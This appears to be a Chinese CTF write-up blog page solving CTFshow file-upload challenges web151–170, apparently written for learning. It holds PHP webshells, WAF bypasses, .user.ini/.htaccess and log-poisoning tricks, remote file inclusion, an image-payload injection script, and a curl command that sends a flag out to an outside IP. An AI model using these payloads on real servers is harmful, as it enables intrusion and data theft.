@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CTFSHOW-文件上传-Writeup | Xrntkk&#39;s Blog</title>
+<meta name="keywords" content="writeup, ctf, Web">
+<meta name="description" content="web151
+
+前台验证
+将一句话木马改成png，抓包修改后缀即可
+
+payload:
+1=system(&#39;cat /var/www/html/flag.php&#39;);
+web152
+这道题没有前端检验，但是解法跟web151是一样的
+
+web153
+一开始尝试了大小写绕过
+
+上传后发现服务器不解析">
+<meta name="author" content="Xrntkk">
+<link rel="canonical" href="http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <meta name="referrer" content="no-referrer-when-downgrade">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.db3874ad7714b044ca574a35a48fc9a38e491dfc56e271a0c1a44fda4c8c0b3d.css" integrity="sha256-2zh0rXcUsETKV0o1pI/Jo45JHfxW4nGgwaRP2kyMCz0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
+  <meta property="og:title" content="CTFSHOW-文件上传-Writeup">
+  <meta property="og:description" content="web151 前台验证
+将一句话木马改成png，抓包修改后缀即可
+payload:
+1=system(&#39;cat /var/www/html/flag.php&#39;); web152 这道题没有前端检验，但是解法跟web151是一样的
+web153 一开始尝试了大小写绕过
+上传后发现服务器不解析">
+  <meta property="og:locale" content="zh">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2024-12-22T00:27:55+08:00">
+    <meta property="article:modified_time" content="2024-12-22T00:27:55+08:00">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Web">
+      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
+<meta name="twitter:title" content="CTFSHOW-文件上传-Writeup">
+<meta name="twitter:description" content="web151
+
+前台验证
+将一句话木马改成png，抓包修改后缀即可
+
+payload:
+1=system(&#39;cat /var/www/html/flag.php&#39;);
+web152
+这道题没有前端检验，但是解法跟web151是一样的
+
+web153
+一开始尝试了大小写绕过
+
+上传后发现服务器不解析">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/post/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CTFSHOW-文件上传-Writeup",
+      "item": "http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CTFSHOW-文件上传-Writeup",
+  "name": "CTFSHOW-文件上传-Writeup",
+  "description": "web151 前台验证\n将一句话木马改成png，抓包修改后缀即可\npayload:\n1=system(\u0026#39;cat /var/www/html/flag.php\u0026#39;); web152 这道题没有前端检验，但是解法跟web151是一样的\nweb153 一开始尝试了大小写绕过\n上传后发现服务器不解析\n",
+  "keywords": [
+    "writeup", "ctf", "Web"
+  ],
+  "articleBody": "web151 前台验证\n将一句话木马改成png，抓包修改后缀即可\npayload:\n1=system('cat /var/www/html/flag.php'); web152 这道题没有前端检验，但是解法跟web151是一样的\nweb153 一开始尝试了大小写绕过\n上传后发现服务器不解析\n这题可以利用.user.ini来进行文件上传\n[文件上传]浅析.user.ini的利用-CSDN博客\n首先我们在文件中写入\n这句话相当于php中的文件包含\n写入后将文件改为png上传，抓包将文件名改为.user.ini\n接着将一句话木马改为1.png上传\n接着访问 /upload/index.php\npayload:\n1=system('tac ../f*'); 注意这个方法的前提是文件上传的目录中有能够执行的php的文件（如index.php）\nweb154 这题跟上题差不多，只是过滤了php\n将一句话木马改成短标签的形式就可以了（我一直用的短标签所以没什么影响）\nweb155 解法同web154一样\nweb156 这题有新的waf,可以测出来waf掉了[]\n那既然这样我们直接读flag就是了\n\u003c?=system('cat ../f*');?\u003e 或者也可以用{}代替[’']\n\u003c?=@eval($_GET{1});?\u003e web157 这道题[]和;都被waf了\npayload:\n\u003c?=system(\"tac ../f*\")?\u003e 不写;就行了\nweb158 这题和上题的解法一样\nweb159 这题waf掉了()\n没有()怎么进行rce呢？我们可以想到``进行命令执行的技巧\npayload:\n\u003c?=`tac ../f*`?\u003e web160 一开始发现.user.ini穿不上，后面测到原来是空格被waf了，.user.ini里也不能有空格\n相比上一题这题将空格和``反引号和log过滤掉了\n这题我们可以考虑使用日志注入的方法\n尝试一下包含日志 nginx的log在/var/log/nginx/access.log\npayload:\n\u003c?=include\"/var/l\".\"og/nginx/access.l\".\"og\"?\u003e 看到有user-agent说明这条路行得通\n直接读flag\nweb161 这一题在上一题的基础上增加了文件头的检验\n我们可以通过在上传文件的时候加上图片的文件头GIF89a进行绕过\n其余和web160无异，利用文件包含进行日志注入即可\nweb162 fuzz一下可以发现这题把.也ban掉了\n所以我们在上传的.user.ini时我们可以去掉文件后缀\nGIF89a\rauto_prepend_file=1 接下来考虑怎么构造读flag\n可以通过取反绕过.的过滤，进行文件包含\n\u003c?=$a=\"Ñ\"?\u003e \u003c?=$b=~$a?\u003e\r\u003c?=$l=\"l\"?\u003e\r\u003c?=$o=\"o\"?\u003e\r\u003c?=$g=\"g\"?\u003e\r\u003c?=include\"/var/$l$o$g/nginx/access$b$l$o$g\"?\u003e 文件 1 中的内容 下面的Ñ 为 . 取反后的字符 十六进制为 D1，利用的时候，在brup 中更改hex里的值。\n日志注入即可\nweb163 这题和上题的条件差不多，但是存在竞争条件，上传图片的话会被删掉\n这题我们尝试使用远程文件包含\n我们把payload写在服务器上，然后起一个http服务\n记住，文件包含时要把ip转换成长整型（.被waf了）\nGIF89a\rauto_prepend_file=http://长整型ip:7777/s 传.user.ini\n接着搓一个发包脚本\n1import requests 2 3while True: 4 burp0_url = \"http://3de6e682-59e3-489c-8e72-2b74e3db5058.challenge.ctf.show/\" 5 burp1_url = \"http://3de6e682-59e3-489c-8e72-2b74e3db5058.challenge.ctf.show/upload/\" 6 burp0_headers = {\"Sec-Ch-Ua-Platform\": \"\\\"Windows\\\"\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"Sec-Ch-Ua\": \"\\\"Not?A_Brand\\\";v=\\\"99\\\", \\\"Chromium\\\";v=\\\"130\\\"\", \"Sec-Ch-Ua-Mobile\": \"?0\", \"X-Requested-With\": \"XMLHttpRequest\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\", \"Accept\": \"application/json, text/javascript, */*; q=0.01\", \"Content-Type\": \"multipart/form-data; boundary=----WebKitFormBoundaryBcDoqZWhQP52WEA6\", \"Origin\": \"https://938b9a73-97ad-4b15-81d8-0101678e16f8.challenge.ctf.show\", \"Sec-Fetch-Site\": \"same-origin\", \"Sec-Fetch-Mode\": \"cors\", \"Sec-Fetch-Dest\": \"empty\", \"Referer\": \"https://938b9a73-97ad-4b15-81d8-0101678e16f8.challenge.ctf.show/\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Priority\": \"u=1, i\", \"Connection\": \"keep-alive\"} 7 burp0_data = \"------WebKitFormBoundaryBcDoqZWhQP52WEA6\\r\\nContent-Disposition: form-data; name=\\\"file\\\"; filename=\\\".user.ini\\\"\\r\\nContent-Type: image/png\\r\\n\\r\\nGIF89a\\r\\nauto_prepend_file=http://长整型ip:7777/shell\\r\\n------WebKitFormBoundaryBcDoqZWhQP52WEA6--\\r\\n\" 8 log = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 9 log1 = requests.get(burp1_url) 10 print(log.status_code) 11 print('\\n') 12 print(log1.text) 13 if \"ctfshow\" in log1.text: 14 print('getflag') 15 break web164 这题随便传个图片试试发现多了个查看图片\nhttps://775e9cd3-3a73-47a1-b31d-7b4450ec5573.challenge.ctf.show/download.php?image=94f7678cc4cda39c02c7890bc8fe6941.png 从url我们可以看出这题存在图片包含\n我们可以利用这个文件包含去执行我们的图片马\n大佬的脚本，可以绕过二次渲染\n1\u003c?php 2$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 3 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 4 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 5 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 6 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 7 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 8 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 9 0x66, 0x44, 0x50, 0x33); 10 11 12 13$img = imagecreatetruecolor(32, 32); 14 15for ($y = 0; $y \u003c sizeof($p); $y += 3) { 16 $r = $p[$y]; 17 $g = $p[$y+1]; 18 $b = $p[$y+2]; 19 $color = imagecolorallocate($img, $r, $g, $b); 20 imagesetpixel($img, round($y / 3), 0, $color); 21} 22 23imagepng($img,'./1.png'); 24?\u003e 图片马的内容 \u003c?$_GET[0]($_POST[1]);?\u003e 没有回显\n外带读flag\nPOST 1=cat f* | curl -X POST -d @- http://106.55.168.231:7777/\rGET 0=system web165 这题考察的也是图片马，但是是用jpg的图片马绕过二次渲染\n大佬的脚本\n1\u003c?php 2 /* 3 4 The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). 5 It is necessary that the size and quality of the initial image are the same as those of the processed image. 6 7 1) Upload an arbitrary image via secured files upload script 8 2) Save the processed image and launch: 9 jpg_payload.php 10 11 In case of successful injection you will get a specially crafted image, which should be uploaded again. 12 13 Since the most straightforward injection method is used, the following problems can occur: 14 1) After the second processing the injected data may become partially corrupted. 15 2) The jpg_payload.php script outputs \"Something's wrong\". 16 If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. 17 18 Sergey Bobrov @Black2Fan. 19 20 See also: 21 https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ 22 23 */ 24\t25 $miniPayload = \"\u003c?=eval(\\$_POST[7]);?\u003e\"; //注意$转义 26 27 28 if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) { 29 die('php-gd is not installed'); 30 } 31 32 if(!isset($argv[1])) { 33 die('php jpg_payload.php '); 34 } 35 36 set_error_handler(\"custom_error_handler\"); 37 38 for($pad = 0; $pad \u003c 1024; $pad++) { 39 $nullbytePayloadSize = $pad; 40 $dis = new DataInputStream($argv[1]); 41 $outStream = file_get_contents($argv[1]); 42 $extraBytes = 0; 43 $correctImage = TRUE; 44 45 if($dis-\u003ereadShort() != 0xFFD8) { 46 die('Incorrect SOI marker'); 47 } 48 49 while((!$dis-\u003eeof()) \u0026\u0026 ($dis-\u003ereadByte() == 0xFF)) { 50 $marker = $dis-\u003ereadByte(); 51 $size = $dis-\u003ereadShort() - 2; 52 $dis-\u003eskip($size); 53 if($marker === 0xDA) { 54 $startPos = $dis-\u003eseek(); 55 $outStreamTmp = 56 substr($outStream, 0, $startPos) . 57 $miniPayload . 58 str_repeat(\"\\0\",$nullbytePayloadSize) . 59 substr($outStream, $startPos); 60 checkImage('_'.$argv[1], $outStreamTmp, TRUE); 61 if($extraBytes !== 0) { 62 while((!$dis-\u003eeof())) { 63 if($dis-\u003ereadByte() === 0xFF) { 64 if($dis-\u003ereadByte !== 0x00) { 65 break; 66 } 67 } 68 } 69 $stopPos = $dis-\u003eseek() - 2; 70 $imageStreamSize = $stopPos - $startPos; 71 $outStream = 72 substr($outStream, 0, $startPos) . 73 $miniPayload . 74 substr( 75 str_repeat(\"\\0\",$nullbytePayloadSize). 76 substr($outStream, $startPos, $imageStreamSize), 77 0, 78 $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 79 substr($outStream, $stopPos); 80 } elseif($correctImage) { 81 $outStream = $outStreamTmp; 82 } else { 83 break; 84 } 85 if(checkImage('payload_'.$argv[1], $outStream)) { 86 die('Success!'); 87 } else { 88 break; 89 } 90 } 91 } 92 } 93 unlink('payload_'.$argv[1]); 94 die('Something\\'s wrong'); 95 96 function checkImage($filename, $data, $unlink = FALSE) { 97 global $correctImage; 98 file_put_contents($filename, $data); 99 $correctImage = TRUE; 100 imagecreatefromjpeg($filename); 101 if($unlink) 102 unlink($filename); 103 return $correctImage; 104 } 105 106 function custom_error_handler($errno, $errstr, $errfile, $errline) { 107 global $extraBytes, $correctImage; 108 $correctImage = FALSE; 109 if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) { 110 if(isset($m[1])) { 111 $extraBytes = (int)$m[1]; 112 } 113 } 114 } 115 116 class DataInputStream { 117 private $binData; 118 private $order; 119 private $size; 120 121 public function __construct($filename, $order = false, $fromString = false) { 122 $this-\u003ebinData = ''; 123 $this-\u003eorder = $order; 124 if(!$fromString) { 125 if(!file_exists($filename) || !is_file($filename)) 126 die('File not exists ['.$filename.']'); 127 $this-\u003ebinData = file_get_contents($filename); 128 } else { 129 $this-\u003ebinData = $filename; 130 } 131 $this-\u003esize = strlen($this-\u003ebinData); 132 } 133 134 public function seek() { 135 return ($this-\u003esize - strlen($this-\u003ebinData)); 136 } 137 138 public function skip($skip) { 139 $this-\u003ebinData = substr($this-\u003ebinData, $skip); 140 } 141 142 public function readByte() { 143 if($this-\u003eeof()) { 144 die('End Of File'); 145 } 146 $byte = substr($this-\u003ebinData, 0, 1); 147 $this-\u003ebinData = substr($this-\u003ebinData, 1); 148 return ord($byte); 149 } 150 151 public function readShort() { 152 if(strlen($this-\u003ebinData) \u003c 2) { 153 die('End Of File'); 154 } 155 $short = substr($this-\u003ebinData, 0, 2); 156 $this-\u003ebinData = substr($this-\u003ebinData, 2); 157 if($this-\u003eorder) { 158 $short = (ord($short[1]) \u003c\u003c 8) + ord($short[0]); 159 } else { 160 $short = (ord($short[0]) \u003c\u003c 8) + ord($short[1]); 161 } 162 return $short; 163 } 164 165 public function eof() { 166 return !$this-\u003ebinData||(strlen($this-\u003ebinData) === 0); 167 } 168 } 169?\u003e jpg图片比较脆弱，成功率很低，我试了十多张图片都没成功\nweb166 zip注入\n这题只能上传zip，上传后会出现查看文件，存在文件包含\n本质上就是利用文件包含执行我们的恶意代码\nweb167 .htaccess文件利用\n什么是.htaccess？\nhtaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。\n如果服务器开启了.htaccess，那我们就可以利用.htaccess将jpg或者png等后缀的文件，作为php文件解析\nAddType/AddHandler application/x-httpd-php \".jpg\" 由于有前端验证，我们要先把编写好的.htaccess文件改为.jpg后缀\n再通过抓包将文件名修改为.htaccess\n接着上传我们写好的一句话木马(后缀为.jpg)\n可以看到我们的一句话木马已经被成功执行了\nweb168 基础免杀\n这题没有限制文件类型，可以上传php\n应该是对关键词有过滤\n简单拼接一下试试，没想到直接成功了\npayload\n\u003c?php $a=\"sys\".\"tem\"; $a($_REQUEST[1]);? GET 1=tac%20../flagaa.php web169 .user.ini文件包含\n前端做了校验只能传zip文件,后端又做了图片文件检查(需要改成image/png).过滤了\u003c\u003e和php\n先上传一个index.php，然后利用日志包含，上传.user.ini 写入以下内容进行包含然后UA里面写木马\nauto_append_file=\"/var/log/nginx/access.log\"\r\u003c?=system('cat ../flagaa.php')?\u003e web170 这题和web169解法一样，也是可以进行日志包含\n",
+  "wordCount" : "2773",
+  "inLanguage": "zh",
+  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2024-12-22T00:27:55+08:00",
+  "dateModified": "2024-12-22T00:27:55+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Xrntkk"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Xrntkk's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/" title="Categories">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      CTFSHOW-文件上传-Writeup
+    </h1>
+<div class="post-meta"><span title='2024-12-22 00:27:55 +0800 CST'>2024-12-22</span>&nbsp;·&nbsp;6 分钟&nbsp;·&nbsp;Xrntkk
+
+<div class="meta-item">&nbsp·&nbsp
+  <span id="busuanzi_container_page_pv">Readings: <span id="busuanzi_value_page_pv"></span></span>
+  </div>      
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">目录</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#web151" aria-label="web151">web151</a></li>
+                <li>
+                    <a href="#web152" aria-label="web152">web152</a></li>
+                <li>
+                    <a href="#web153" aria-label="web153">web153</a></li>
+                <li>
+                    <a href="#web154" aria-label="web154">web154</a></li>
+                <li>
+                    <a href="#web155" aria-label="web155">web155</a></li>
+                <li>
+                    <a href="#web156" aria-label="web156">web156</a></li>
+                <li>
+                    <a href="#web157" aria-label="web157">web157</a></li>
+                <li>
+                    <a href="#web158" aria-label="web158">web158</a></li>
+                <li>
+                    <a href="#web159" aria-label="web159">web159</a></li>
+                <li>
+                    <a href="#web160" aria-label="web160">web160</a></li>
+                <li>
+                    <a href="#web161" aria-label="web161">web161</a></li>
+                <li>
+                    <a href="#web162" aria-label="web162">web162</a></li>
+                <li>
+                    <a href="#web163" aria-label="web163">web163</a></li>
+                <li>
+                    <a href="#web164" aria-label="web164">web164</a></li>
+                <li>
+                    <a href="#web165" aria-label="web165">web165</a></li>
+                <li>
+                    <a href="#web166" aria-label="web166">web166</a></li>
+                <li>
+                    <a href="#web167" aria-label="web167">web167</a></li>
+                <li>
+                    <a href="#web168" aria-label="web168">web168</a></li>
+                <li>
+                    <a href="#web169" aria-label="web169">web169</a></li>
+                <li>
+                    <a href="#web170" aria-label="web170">web170</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h4 id="web151">web151<a hidden class="anchor" aria-hidden="true" href="#web151">#</a></h4>
+<p><img alt="image-20250126161249975" loading="lazy" src="../assets/image-20250126161249975.png"></p>
+<p>前台验证</p>
+<p>将一句话木马改成png，抓包修改后缀即可</p>
+<p><img alt="image-20250126162045356" loading="lazy" src="../assets/image-20250126162045356.png"></p>
+<p>payload:</p>
+<pre tabindex="0"><code>1=system(&#39;cat /var/www/html/flag.php&#39;);
+</code></pre><h4 id="web152">web152<a hidden class="anchor" aria-hidden="true" href="#web152">#</a></h4>
+<p>这道题没有前端检验，但是解法跟web151是一样的</p>
+<p><img alt="image-20250126162605410" loading="lazy" src="../assets/image-20250126162605410.png"></p>
+<h4 id="web153">web153<a hidden class="anchor" aria-hidden="true" href="#web153">#</a></h4>
+<p>一开始尝试了大小写绕过</p>
+<p><img alt="image-20250126162904156" loading="lazy" src="../assets/image-20250126162904156.png"></p>
+<p>上传后发现服务器不解析</p>
+<p>这题可以利用.user.ini来进行文件上传</p>
+<p>[<a href="https://blog.csdn.net/cosmoslin/article/details/120793126">文件上传]浅析.user.ini的利用-CSDN博客</a></p>
+<p>首先我们在文件中写入</p>
+<p><img alt="image-20250126180536890" loading="lazy" src="../assets/image-20250126180536890.png"></p>
+<p>这句话相当于php中的文件包含</p>
+<p>写入后将文件改为png上传，抓包将文件名改为.user.ini</p>
+<p><img alt="image-20250126181011811" loading="lazy" src="../assets/image-20250126181011811.png"></p>
+<p>接着将一句话木马改为1.png上传</p>
+<p><img alt="image-20250126181138882" loading="lazy" src="../assets/image-20250126181138882.png"></p>
+<p>接着访问 /upload/index.php</p>
+<p>payload:</p>
+<pre tabindex="0"><code>1=system(&#39;tac ../f*&#39;);
+</code></pre><p><img alt="image-20250126181319071" loading="lazy" src="../assets/image-20250126181319071.png"></p>
+<p>注意这个方法的前提是文件上传的目录中有能够执行的php的文件（如index.php）</p>
+<h4 id="web154">web154<a hidden class="anchor" aria-hidden="true" href="#web154">#</a></h4>
+<p>这题跟上题差不多，只是过滤了php</p>
+<p>将一句话木马改成短标签的形式就可以了（我一直用的短标签所以没什么影响）</p>
+<h4 id="web155">web155<a hidden class="anchor" aria-hidden="true" href="#web155">#</a></h4>
+<p>解法同web154一样</p>
+<h4 id="web156">web156<a hidden class="anchor" aria-hidden="true" href="#web156">#</a></h4>
+<p><img alt="image-20250126194012094" loading="lazy" src="../assets/image-20250126194012094.png"></p>
+<p>这题有新的waf,可以测出来waf掉了[]</p>
+<p>那既然这样我们直接读flag就是了</p>
+<pre tabindex="0"><code>&lt;?=system(&#39;cat ../f*&#39;);?&gt;
+</code></pre><p>或者也可以用{}代替[&rsquo;']</p>
+<pre tabindex="0"><code>&lt;?=@eval($_GET{1});?&gt;
+</code></pre><h4 id="web157">web157<a hidden class="anchor" aria-hidden="true" href="#web157">#</a></h4>
+<p><img alt="image-20250126203400690" loading="lazy" src="../assets/image-20250126203400690.png"></p>
+<p>这道题[]和;都被waf了</p>
+<p>payload:</p>
+<pre tabindex="0"><code>&lt;?=system(&#34;tac ../f*&#34;)?&gt;
+</code></pre><p>不写;就行了</p>
+<h4 id="web158">web158<a hidden class="anchor" aria-hidden="true" href="#web158">#</a></h4>
+<p>这题和上题的解法一样</p>
+<h4 id="web159">web159<a hidden class="anchor" aria-hidden="true" href="#web159">#</a></h4>
+<p><img alt="image-20250126205519235" loading="lazy" src="../assets/image-20250126205519235.png"></p>
+<p>这题waf掉了()</p>
+<p>没有()怎么进行rce呢？我们可以想到``进行命令执行的技巧</p>
+<p>payload:</p>
+<pre tabindex="0"><code>&lt;?=`tac ../f*`?&gt;
+</code></pre><h4 id="web160">web160<a hidden class="anchor" aria-hidden="true" href="#web160">#</a></h4>
+<p><img alt="image-20250126211936519" loading="lazy" src="../assets/image-20250126211936519.png"></p>
+<p>一开始发现.user.ini穿不上，后面测到原来是空格被waf了，.user.ini里也不能有空格</p>
+<p>相比上一题这题将空格和``反引号和log过滤掉了</p>
+<p>这题我们可以考虑使用日志注入的方法</p>
+<p>尝试一下包含日志 nginx的log在/var/log/nginx/access.log</p>
+<p>payload:</p>
+<pre tabindex="0"><code>&lt;?=include&#34;/var/l&#34;.&#34;og/nginx/access.l&#34;.&#34;og&#34;?&gt;
+</code></pre><p><img alt="image-20250126213809672" loading="lazy" src="../assets/image-20250126213809672.png"></p>
+<p>看到有user-agent说明这条路行得通</p>
+<p><img alt="image-20250126214026378" loading="lazy" src="../assets/image-20250126214026378.png"></p>
+<p>直接读flag</p>
+<p><img alt="image-20250126214050381" loading="lazy" src="../assets/image-20250126214050381.png"></p>
+<h4 id="web161">web161<a hidden class="anchor" aria-hidden="true" href="#web161">#</a></h4>
+<p>这一题在上一题的基础上增加了文件头的检验</p>
+<p>我们可以通过在上传文件的时候加上图片的文件头<strong>GIF89a</strong>进行绕过</p>
+<p><img alt="image-20250126214924176" loading="lazy" src="../assets/image-20250126214924176.png"></p>
+<p>其余和web160无异，利用文件包含进行日志注入即可</p>
+<h4 id="web162">web162<a hidden class="anchor" aria-hidden="true" href="#web162">#</a></h4>
+<p><img alt="image-20250127133207076" loading="lazy" src="../assets/image-20250127133207076.png"></p>
+<p>fuzz一下可以发现这题把.也ban掉了</p>
+<p>所以我们在上传的.user.ini时我们可以去掉文件后缀</p>
+<p><img alt="image-20250127133616972" loading="lazy" src="../assets/image-20250127133616972.png"></p>
+<pre tabindex="0"><code>GIF89a
+auto_prepend_file=1
+</code></pre><p>接下来考虑怎么构造读flag</p>
+<p>可以通过取反绕过.的过滤，进行文件包含</p>
+<pre tabindex="0"><code>&lt;?=$a=&#34;Ñ&#34;?&gt;  
+&lt;?=$b=~$a?&gt;
+&lt;?=$l=&#34;l&#34;?&gt;
+&lt;?=$o=&#34;o&#34;?&gt;
+&lt;?=$g=&#34;g&#34;?&gt;
+&lt;?=include&#34;/var/$l$o$g/nginx/access$b$l$o$g&#34;?&gt;
+</code></pre><p>文件 1 中的内容 下面的Ñ 为 . 取反后的字符 十六进制为 D1，利用的时候，在brup 中更改hex里的值。</p>
+<p><img alt="image-20250127170656873" loading="lazy" src="../assets/image-20250127170656873.png"></p>
+<p><img alt="image-20250127170901922" loading="lazy" src="../assets/image-20250127170901922.png"></p>
+<p><img alt="image-20250127171226549" loading="lazy" src="../assets/image-20250127171226549.png"></p>
+<p>日志注入即可</p>
+<h4 id="web163">web163<a hidden class="anchor" aria-hidden="true" href="#web163">#</a></h4>
+<p>这题和上题的条件差不多，但是存在竞争条件，上传图片的话会被删掉</p>
+<p>这题我们尝试使用<strong>远程文件包含</strong></p>
+<p><img alt="image-20250127182717535" loading="lazy" src="../assets/image-20250127182717535.png"></p>
+<p>我们把payload写在服务器上，然后起一个http服务</p>
+<p><img alt="image-20250127182913096" loading="lazy" src="../assets/image-20250127182913096.png"></p>
+<p>记住，文件包含时要把ip转换成长整型（.被waf了）</p>
+<pre tabindex="0"><code>GIF89a
+auto_prepend_file=http://长整型ip:7777/s
+</code></pre><p><img alt="image-20250127183049980" loading="lazy" src="../assets/image-20250127183049980.png"></p>
+<p>传.user.ini</p>
+<p>接着搓一个发包脚本</p>
